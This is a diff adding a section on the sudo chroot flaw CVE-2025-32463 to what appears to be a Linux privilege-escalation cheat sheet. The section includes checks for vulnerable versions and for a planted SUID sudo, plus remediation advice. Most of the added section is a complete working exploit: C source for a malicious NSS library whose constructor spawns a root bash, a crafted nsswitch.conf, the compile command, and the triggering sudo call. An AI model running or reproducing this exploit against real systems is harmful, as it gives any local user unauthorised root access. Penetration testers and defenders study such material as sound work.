@@ -86,6 +86,41 @@ make
 
 ---
 
+### sudo chroot NSS — CVE-2025-32463
+
+**Impact:** Any local user → root, **regardless of sudoers policy** (works even when
+`sudo -l` says "user may not run sudo"). Affects sudo 1.9.14 – 1.9.17 (fixed 1.9.17p1).
+
+```bash
+# Check — and watch for a SUID sudo planted ahead of the system one in PATH:
+find / -perm -4000 -type f 2>/dev/null | grep -i sudo   # e.g. /usr/local/bin/sudo
+echo $PATH                                               # /usr/local/bin first?
+sudo --version   # 1.9.14 – 1.9.17 = vulnerable
+
+# Why: sudo -R/--chroot applies the chroot while still root, then glibc NSS reads
+# etc/nsswitch.conf from INSIDE the attacker-controlled dir and loads the .so it names.
+# A library constructor therefore runs as root before privileges drop.
+
+# Self-authored PoC (no foreign binary; build + run on target):
+mkdir -p exploit/woot/etc exploit/libnss_ && cd exploit
+cat > woot.c <<'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor)) void woot(void){ setreuid(0,0); setregid(0,0); chdir("/"); execl("/bin/bash","bash","-i",(char*)NULL); }
+EOF
+echo 'passwd: /woot1337' > woot/etc/nsswitch.conf
+cp /etc/group woot/etc/
+gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot.c
+sudo -R woot woot        # -> root shell
+# Public PoC: https://github.com/pr0v3rbs/CVE-2025-32463_chwoot (Stratascale advisory)
+```
+
+> A `sudo` newer than the distro package, SUID-root, first in `$PATH`, is the tell. "May
+> not run sudo" does NOT mean sudo is safe — this flaw is in sudo's privileged startup,
+> not the policy. Remediation: patch to 1.9.17p1+ and remove any planted `/usr/local/bin/sudo`.
+
+---
+
 ### Polkit AuthAdmin Bypass — CVE-2021-3560
 
 **Impact:** Any local user → root via race condition in polkit authentication.
